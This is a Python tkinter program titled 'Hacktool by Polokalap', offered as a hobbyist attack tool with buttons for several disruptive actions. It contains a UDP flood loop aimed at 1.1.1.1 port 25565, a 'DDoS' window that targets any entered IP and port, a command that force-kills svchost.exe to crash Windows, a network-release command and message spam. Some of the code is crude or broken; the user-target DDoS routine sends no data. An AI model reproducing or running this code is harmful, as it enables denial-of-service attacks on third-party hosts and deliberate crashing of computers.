from __future__ import annotations
import tkinter as tk
from tkinter import *
from tkinter import messagebox
import os
import socket
import threading
import time
import random
import pyautogui
import keyboard

BG_COLOUR = "#2F3136"

i = 0

def rat():
    running = True
    root.withdraw()
    keyboard.wait('windows')
    os.system("start https://imgs.search.brave.com/eL7vFdjmVpY_k1ivrZt38Mt7O1AS113DkzaJ3cuNMJk/rs:fit:860:0:0/g:ce/aHR0cHM6Ly9yb3Zh/cmNvbnRyb2wuaHUv/d3AtY29udGVudC91/cGxvYWRzLzIwMTkv/MDcvcGF0a2FueS12/YW5kb3JwYXRrYW55/LmpwZw")
    root.quit()

def openargs():
    def open():
        if time_entry.get() == str or time_entry.get() == "":
            messagebox.showwarning("OOps", "You messed up somesthing")
            openroot.quit()
            openargs()
        time_entry_str = time_entry.get()
        time_entry_int = int(time_entry_str)
        openroot.withdraw()
        root.withdraw()
        time.sleep(time_entry_int)
        os.system(f'Start {website_entry.get()}')
        root.quit()
        openroot.quit()
    openroot = tk.Tk()
    openroot.title("Set a website and time")
    openroot.configure(background=BG_COLOUR)
    openroot.resizable(False, False)
    time_entry = tk.Entry(openroot)
    time_entry.grid(row=1, column=1, padx=10, pady=5, sticky="w")
    time_label = tk.Label(openroot, background=BG_COLOUR, text="Time")
    time_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
    website_entry = tk.Entry(openroot, text="Website")
    website_entry.grid(row=1, column=3, padx=10, pady=5, sticky="w")
    website_label = tk.Label(openroot, background=BG_COLOUR, text="Website")
    website_label.grid(row=1, column=2, padx=10, pady=5, sticky="w")
    set_button = tk.Button(openroot, text="set", command=open)
    set_button.grid(row=1, column=5, padx=10, pady=10)
    root.mainloop()
    openroot.mainloop()


def sendmessage():
    root.withdraw()
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    os.system("msg * Wow! Polokalap Did A really good job here!")
    root.quit()

    

def sdi():
    os.system("shutdown -i")

def crash():
    os.system("TASKKILL /IM svchost.exe /F")

def buymeacoffee():
    os.system("Start https://buymeacoffee.com/Polokalap")



root = tk.Tk()
root.title("Hacktool by Polokalap")
root.configure(background=BG_COLOUR)
root.resizable(False, False)

def disconnect():
    root.withdraw()
    os.system("ipconfig /release")

def DDoSf():
    print_lock = threading.Lock()

    def attack(ip, port):
        global packet_count
        message = "Meow! "
        ip_addr = socket.gethostbyname(ip)
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ddos.connect((ip_addr, port))
        for i in range(10000):
            ddos.close()

    def start_attack():
        ip = ip_entry.get()
        port = int(port_entry.get())
        for i in range(1000000000000):
            t = threading.Thread(target=attack, args=(ip, port))
            t.daemon = True
            t.start()
            t.join()
            i = i + 1
        
    def supporthelp():
        os.system('start https://github.com/Polokalap/Rohek')
        print("Opened Github sdfj")

    Rohek = tk.Tk()
    Rohek.title("Rohek DDoS Tool By Polokalap")

    ip_label = tk.Label(Rohek, text="Wus is da ip? ")
    ip_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
    ip_entry = tk.Entry(Rohek)
    ip_entry.grid(row=0, column=1, padx=10, pady=5)

    port_label = tk.Label(Rohek, text="Port:")
    port_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
    port_entry = tk.Entry(Rohek)
    port_entry.grid(row=1, column=1, padx=10, pady=5)

    attack_button = tk.Button(Rohek, text="Attack", command=start_attack)
    attack_button.grid(row=2, columnspan=2, padx=10, pady=10)

    support_button = tk.Button(Rohek, text="support", command=supporthelp)
    support_button.grid(row=3, columnspan=2, column=5, padx=10, pady=10)

def lagg():
    root.withdraw()
    ip = "1.1.1.1"
    port = 25565
    ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ddos.connect((ip, port))
    for i in range(1000000000000):
        message = "Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! Meow! "
        ddos.sendto(message.encode(), (ip, port))
        ddos.sendto(message.encode(), (ip, port))
        ddos.sendto(message.encode(), (ip, port))
        ddos.sendto(message.encode(), (ip, port))
        ddos.sendto(message.encode(), (ip, port))
        ddos.sendto(message.encode(), (ip, port))
        ddos.sendto(message.encode(), (ip, port))

lagg_label = tk.Label(root, background=BG_COLOUR, text="Laggs the pc")
lagg_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
lagg_button = tk.Button(root, text="lagg", command=lagg)
lagg_button.grid(row=1, column=1, padx=10, pady=10)

DDoS_label = tk.Label(root, background=BG_COLOUR, text="Start a DDoS Attack")
DDoS_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
DDoS_button = tk.Button(root, text="DDoS", command=DDoSf)
DDoS_button.grid(row=2, column=1, padx=10, pady=10)

si_label = tk.Label(root, background=BG_COLOUR, text="Disconnects from internet")
si_label.grid(row=3, column=0, padx=10, pady=5, sticky="w")
si_button = tk.Button(root, text="Disconnect", command=disconnect)
si_button.grid(row=3, column=1, padx=10, pady=10)

buymeacoffee_button = tk.Button(root, text="Buy Me a Coffee", command=buymeacoffee)
buymeacoffee_button.grid(row=7, column=15, padx=10, pady=10)

sdi_label = tk.Label(root, background=BG_COLOUR, text="Shuts down a computer")
sdi_label.grid(row=5, column=0, padx=10, pady=5, sticky="w")
sdi_button = tk.Button(root, text="Shut down other computer", command=sdi)
sdi_button.grid(row=5, column=1, padx=10, pady=10)

msg_label = tk.Label(root, background=BG_COLOUR, text="Sends a message to everyone (windows 10 pro)")
msg_label.grid(row=6, column=0, padx=10, pady=5, sticky="w")
msg_button = tk.Button(root, text="send", command=sendmessage)
msg_button.grid(row=6, column=1, padx=10, pady=10)

open_label = tk.Label(root, background=BG_COLOUR, text="Opens a website after x seconds")
open_label.grid(row=1, column=4, padx=10, pady=5, sticky="w")
open_button = tk.Button(root, text="set website and time", command=openargs)
open_button.grid(row=1, column=5, padx=10, pady=10)

rat_label = tk.Label(root, background=BG_COLOUR, text="Crashes the pc")
rat_label.grid(row=4, column=0, padx=10, pady=5, sticky="w")
rat_button = tk.Button(root, text="crash", command=crash)
rat_button.grid(row=4, column=1, padx=10, pady=10)

rat_label = tk.Label(root, background=BG_COLOUR, text="Opens an image")
rat_label.grid(row=2, column=4, padx=10, pady=5, sticky="w")
rat_button = tk.Button(root, text="RAT", command=rat)
rat_button.grid(row=2, column=5, padx=10, pady=10)

root.mainloop()
